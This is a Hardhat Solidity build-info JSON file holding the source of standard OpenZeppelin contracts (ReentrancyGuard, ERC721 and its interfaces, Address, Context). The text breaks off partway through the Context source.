{"id":"8e19253b50418b98c238a8c6f2a18503","_format":"hh-sol-build-info-1","solcVersion":"0.8.7","solcLongVersion":"0.8.7+commit.e28d00a7","input":{"language":"Solidity","sources":{"@openzeppelin/contracts/security/ReentrancyGuard.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Contract module that helps prevent reentrant calls to a function.\n *\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\n * available, which can be applied to functions to make sure there are no nested\n * (reentrant) calls to them.\n *\n * Note that because there is a single `nonReentrant` guard, functions marked as\n * `nonReentrant` may not call one another. This can be worked around by making\n * those functions `private`, and then adding `external` `nonReentrant` entry\n * points to them.\n *\n * TIP: If you would like to learn more about reentrancy and alternative ways\n * to protect against it, check out our blog post\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\n */\nabstract contract ReentrancyGuard {\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\n    // The values being non-zero value makes deployment a bit more expensive,\n    // but in exchange the refund on every call to nonReentrant will be lower in\n    // amount. Since refunds are capped to a percentage of the total\n    // transaction's gas, it is best to keep them low in cases like this one, to\n    // increase the likelihood of the full refund coming into effect.\n    uint256 private constant _NOT_ENTERED = 1;\n    uint256 private constant _ENTERED = 2;\n\n    uint256 private _status;\n\n    constructor() {\n        _status = _NOT_ENTERED;\n    }\n\n    /**\n     * @dev Prevents a contract from calling itself, directly or indirectly.\n     * Calling a `nonReentrant` function from another `nonReentrant`\n     * function is not supported. It is possible to prevent this from happening\n     * by making the `nonReentrant` function external, and making it call a\n     * `private` function that does the actual work.\n     */\n    modifier nonReentrant() {\n        _nonReentrantBefore();\n        _;\n        _nonReentrantAfter();\n    }\n\n    function _nonReentrantBefore() private {\n        // On the first call to nonReentrant, _status will be _NOT_ENTERED\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n\n        // Any calls to nonReentrant after this point will fail\n        _status = _ENTERED;\n    }\n\n    function _nonReentrantAfter() private {\n        // By storing the original value once again, a refund is triggered (see\n        // https://eips.ethereum.org/EIPS/eip-2200)\n        _status = _NOT_ENTERED;\n    }\n}\n"},"@openzeppelin/contracts/token/ERC721/ERC721.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/ERC721.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC721.sol\";\nimport \"./IERC721Receiver.sol\";\nimport \"./extensions/IERC721Metadata.sol\";\nimport \"../../utils/Address.sol\";\nimport \"../../utils/Context.sol\";\nimport \"../../utils/Strings.sol\";\nimport \"../../utils/introspection/ERC165.sol\";\n\n/**\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\n * the Metadata extension, but not including the Enumerable extension, which is available separately as\n * {ERC721Enumerable}.\n */\ncontract ERC721 is Context, ERC165, IERC721, IERC721Metadata {\n    using Address for address;\n    using Strings for uint256;\n\n    // Token name\n    string private _name;\n\n    // Token symbol\n    string private _symbol;\n\n    // Mapping from token ID to owner address\n    mapping(uint256 => address) private _owners;\n\n    // Mapping owner address to token count\n    mapping(address => uint256) private _balances;\n\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) private _tokenApprovals;\n\n    // Mapping from owner to operator approvals\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\n\n    /**\n     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\n        return\n            interfaceId == type(IERC721).interfaceId ||\n            interfaceId == type(IERC721Metadata).interfaceId ||\n            super.supportsInterface(interfaceId);\n    }\n\n    /**\n     * @dev See {IERC721-balanceOf}.\n     */\n    function balanceOf(address owner) public view virtual override returns (uint256) {\n        require(owner != address(0), \"ERC721: address zero is not a valid owner\");\n        return _balances[owner];\n    }\n\n    /**\n     * @dev See {IERC721-ownerOf}.\n     */\n    function ownerOf(uint256 tokenId) public view virtual override returns (address) {\n        address owner = _ownerOf(tokenId);\n        require(owner != address(0), \"ERC721: invalid token ID\");\n        return owner;\n    }\n\n    /**\n     * @dev See {IERC721Metadata-name}.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {IERC721Metadata-symbol}.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev See {IERC721Metadata-tokenURI}.\n     */\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        _requireMinted(tokenId);\n\n        string memory baseURI = _baseURI();\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\n    }\n\n    /**\n     * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each\n     * token will be the concatenation of the `baseURI` and the `tokenId`. Empty\n     * by default, can be overridden in child contracts.\n     */\n    function _baseURI() internal view virtual returns (string memory) {\n        return \"\";\n    }\n\n    /**\n     * @dev See {IERC721-approve}.\n     */\n    function approve(address to, uint256 tokenId) public virtual override {\n        address owner = ERC721.ownerOf(tokenId);\n        require(to != owner, \"ERC721: approval to current owner\");\n\n        require(\n            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n            \"ERC721: approve caller is not token owner or approved for all\"\n        );\n\n        _approve(to, tokenId);\n    }\n\n    /**\n     * @dev See {IERC721-getApproved}.\n     */\n    function getApproved(uint256 tokenId) public view virtual override returns (address) {\n        _requireMinted(tokenId);\n\n        return _tokenApprovals[tokenId];\n    }\n\n    /**\n     * @dev See {IERC721-setApprovalForAll}.\n     */\n    function setApprovalForAll(address operator, bool approved) public virtual override {\n        _setApprovalForAll(_msgSender(), operator, approved);\n    }\n\n    /**\n     * @dev See {IERC721-isApprovedForAll}.\n     */\n    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {\n        return _operatorApprovals[owner][operator];\n    }\n\n    /**\n     * @dev See {IERC721-transferFrom}.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override {\n        //solhint-disable-next-line max-line-length\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: caller is not token owner or approved\");\n\n        _transfer(from, to, tokenId);\n    }\n\n    /**\n     * @dev See {IERC721-safeTransferFrom}.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override {\n        safeTransferFrom(from, to, tokenId, \"\");\n    }\n\n    /**\n     * @dev See {IERC721-safeTransferFrom}.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) public virtual override {\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: caller is not token owner or approved\");\n        _safeTransfer(from, to, tokenId, data);\n    }\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n     *\n     * `data` is additional data, it has no specified format and it is sent in call to `to`.\n     *\n     * This internal function is equivalent to {safeTransferFrom}, and can be used to e.g.\n     * implement alternative mechanisms to perform token transfer, such as signature-based.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _safeTransfer(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) internal virtual {\n        _transfer(from, to, tokenId);\n        require(_checkOnERC721Received(from, to, tokenId, data), \"ERC721: transfer to non ERC721Receiver implementer\");\n    }\n\n    /**\n     * @dev Returns the owner of the `tokenId`. Does NOT revert if token doesn't exist\n     */\n    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {\n        return _owners[tokenId];\n    }\n\n    /**\n     * @dev Returns whether `tokenId` exists.\n     *\n     * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.\n     *\n     * Tokens start existing when they are minted (`_mint`),\n     * and stop existing when they are burned (`_burn`).\n     */\n    function _exists(uint256 tokenId) internal view virtual returns (bool) {\n        return _ownerOf(tokenId) != address(0);\n    }\n\n    /**\n     * @dev Returns whether `spender` is allowed to manage `tokenId`.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {\n        address owner = ERC721.ownerOf(tokenId);\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n    }\n\n    /**\n     * @dev Safely mints `tokenId` and transfers it to `to`.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _safeMint(address to, uint256 tokenId) internal virtual {\n        _safeMint(to, tokenId, \"\");\n    }\n\n    /**\n     * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is\n     * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.\n     */\n    function _safeMint(\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) internal virtual {\n        _mint(to, tokenId);\n        require(\n            _checkOnERC721Received(address(0), to, tokenId, data),\n            \"ERC721: transfer to non ERC721Receiver implementer\"\n        );\n    }\n\n    /**\n     * @dev Mints `tokenId` and transfers it to `to`.\n     *\n     * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - `to` cannot be the zero address.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _mint(address to, uint256 tokenId) internal virtual {\n        require(to != address(0), \"ERC721: mint to the zero address\");\n        require(!_exists(tokenId), \"ERC721: token already minted\");\n\n        _beforeTokenTransfer(address(0), to, tokenId, 1);\n\n        // Check that tokenId was not minted by `_beforeTokenTransfer` hook\n        require(!_exists(tokenId), \"ERC721: token already minted\");\n\n        unchecked {\n            // Will not overflow unless all 2**256 token ids are minted to the same owner.\n            // Given that tokens are minted one by one, it is impossible in practice that\n            // this ever happens. Might change if we allow batch minting.\n            // The ERC fails to describe this case.\n            _balances[to] += 1;\n        }\n\n        _owners[tokenId] = to;\n\n        emit Transfer(address(0), to, tokenId);\n\n        _afterTokenTransfer(address(0), to, tokenId, 1);\n    }\n\n    /**\n     * @dev Destroys `tokenId`.\n     * The approval is cleared when the token is burned.\n     * This is an internal function that does not check if the sender is authorized to operate on the token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _burn(uint256 tokenId) internal virtual {\n        address owner = ERC721.ownerOf(tokenId);\n\n        _beforeTokenTransfer(owner, address(0), tokenId, 1);\n\n        // Update ownership in case tokenId was transferred by `_beforeTokenTransfer` hook\n        owner = ERC721.ownerOf(tokenId);\n\n        // Clear approvals\n        delete _tokenApprovals[tokenId];\n\n        unchecked {\n            // Cannot overflow, as that would require more tokens to be burned/transferred\n            // out than the owner initially received through minting and transferring in.\n            _balances[owner] -= 1;\n        }\n        delete _owners[tokenId];\n\n        emit Transfer(owner, address(0), tokenId);\n\n        _afterTokenTransfer(owner, address(0), tokenId, 1);\n    }\n\n    /**\n     * @dev Transfers `tokenId` from `from` to `to`.\n     *  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual {\n        require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n        require(to != address(0), \"ERC721: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, tokenId, 1);\n\n        // Check that tokenId was not transferred by `_beforeTokenTransfer` hook\n        require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n\n        // Clear approvals from the previous owner\n        delete _tokenApprovals[tokenId];\n\n        unchecked {\n            // `_balances[from]` cannot overflow for the same reason as described in `_burn`:\n            // `from`'s balance is the number of token held, which is at least one before the current\n            // transfer.\n            // `_balances[to]` could overflow in the conditions described in `_mint`. That would require\n            // all 2**256 token ids to be minted, which in practice is impossible.\n            _balances[from] -= 1;\n            _balances[to] += 1;\n        }\n        _owners[tokenId] = to;\n\n        emit Transfer(from, to, tokenId);\n\n        _afterTokenTransfer(from, to, tokenId, 1);\n    }\n\n    /**\n     * @dev Approve `to` to operate on `tokenId`\n     *\n     * Emits an {Approval} event.\n     */\n    function _approve(address to, uint256 tokenId) internal virtual {\n        _tokenApprovals[tokenId] = to;\n        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);\n    }\n\n    /**\n     * @dev Approve `operator` to operate on all of `owner` tokens\n     *\n     * Emits an {ApprovalForAll} event.\n     */\n    function _setApprovalForAll(\n        address owner,\n        address operator,\n        bool approved\n    ) internal virtual {\n        require(owner != operator, \"ERC721: approve to caller\");\n        _operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    }\n\n    /**\n     * @dev Reverts if the `tokenId` has not been minted yet.\n     */\n    function _requireMinted(uint256 tokenId) internal view virtual {\n        require(_exists(tokenId), \"ERC721: invalid token ID\");\n    }\n\n    /**\n     * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.\n     * The call is not executed if the target address is not a contract.\n     *\n     * @param from address representing the previous owner of the given token ID\n     * @param to target address that will receive the tokens\n     * @param tokenId uint256 ID of the token to be transferred\n     * @param data bytes optional data to send along with the call\n     * @return bool whether the call correctly returned the expected magic value\n     */\n    function _checkOnERC721Received(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) private returns (bool) {\n        if (to.isContract()) {\n            try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {\n                return retval == IERC721Receiver.onERC721Received.selector;\n            } catch (bytes memory reason) {\n                if (reason.length == 0) {\n                    revert(\"ERC721: transfer to non ERC721Receiver implementer\");\n                } else {\n                    /// @solidity memory-safe-assembly\n                    assembly {\n                        revert(add(32, reason), mload(reason))\n                    }\n                }\n            }\n        } else {\n            return true;\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any token transfer. This includes minting and burning. If {ERC721Consecutive} is\n     * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\n     *\n     * Calling conditions:\n     *\n     * - When `from` and `to` are both non-zero, ``from``'s tokens will be transferred to `to`.\n     * - When `from` is zero, the tokens will be minted for `to`.\n     * - When `to` is zero, ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     * - `batchSize` is non-zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256, /* firstTokenId */\n        uint256 batchSize\n    ) internal virtual {\n        if (batchSize > 1) {\n            if (from != address(0)) {\n                _balances[from] -= batchSize;\n            }\n            if (to != address(0)) {\n                _balances[to] += batchSize;\n            }\n        }\n    }\n\n    /**\n     * @dev Hook that is called after any token transfer. This includes minting and burning. If {ERC721Consecutive} is\n     * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\n     *\n     * Calling conditions:\n     *\n     * - When `from` and `to` are both non-zero, ``from``'s tokens were transferred to `to`.\n     * - When `from` is zero, the tokens were minted for `to`.\n     * - When `to` is zero, ``from``'s tokens were burned.\n     * - `from` and `to` are never both zero.\n     * - `batchSize` is non-zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 firstTokenId,\n        uint256 batchSize\n    ) internal virtual {}\n}\n"},"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../IERC721.sol\";\n\n/**\n * @title ERC-721 Non-Fungible Token Standard, optional metadata extension\n * @dev See https://eips.ethereum.org/EIPS/eip-721\n */\ninterface IERC721Metadata is IERC721 {\n    /**\n     * @dev Returns the token collection name.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the token collection symbol.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.\n     */\n    function tokenURI(uint256 tokenId) external view returns (string memory);\n}\n"},"@openzeppelin/contracts/token/ERC721/IERC721.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/IERC721.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../../utils/introspection/IERC165.sol\";\n\n/**\n * @dev Required interface of an ERC721 compliant contract.\n */\ninterface IERC721 is IERC165 {\n    /**\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n\n    /**\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\n     */\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\n\n    /**\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\n     */\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n\n    /**\n     * @dev Returns the number of tokens in ``owner``'s account.\n     */\n    function balanceOf(address owner) external view returns (uint256 balance);\n\n    /**\n     * @dev Returns the owner of the `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes calldata data\n    ) external;\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n\n    /**\n     * @dev Transfers `tokenId` token from `from` to `to`.\n     *\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n\n    /**\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\n     * The approval is cleared when the token is transferred.\n     *\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\n     *\n     * Requirements:\n     *\n     * - The caller must own the token or be an approved operator.\n     * - `tokenId` must exist.\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address to, uint256 tokenId) external;\n\n    /**\n     * @dev Approve or remove `operator` as an operator for the caller.\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\n     *\n     * Requirements:\n     *\n     * - The `operator` cannot be the caller.\n     *\n     * Emits an {ApprovalForAll} event.\n     */\n    function setApprovalForAll(address operator, bool _approved) external;\n\n    /**\n     * @dev Returns the account approved for `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function getApproved(uint256 tokenId) external view returns (address operator);\n\n    /**\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\n     *\n     * See {setApprovalForAll}\n     */\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\n}\n"},"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @title ERC721 token receiver interface\n * @dev Interface for any contract that wants to support safeTransfers\n * from ERC721 asset contracts.\n */\ninterface IERC721Receiver {\n    /**\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\n     * by `operator` from `from`, this function is called.\n     *\n     * It must return its Solidity selector to confirm the token transfer.\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\n     *\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\n     */\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n"},"@openzeppelin/contracts/utils/Address.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)\n\npragma solidity ^0.8.1;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call{value: amount}(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n        if (success) {\n            if (returndata.length == 0) {\n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract(target), \"Address: call to non-contract\");\n            }\n            return returndata;\n        } else {\n            _revert(returndata, errorMessage);\n        }\n    }\n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            _revert(returndata, errorMessage);\n        }\n    }\n\n    function _revert(bytes memory returndata, string memory errorMessage) private pure {\n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0) {\n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly {\n                let returndata_size := mload(returndata)\n                revert(add(32, returndata), returndata_size)\n            }\n        } else {\n            revert(errorMessage);\n        }\n    }\n}\n"},"@openzeppelin/contracts/utils/Context.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    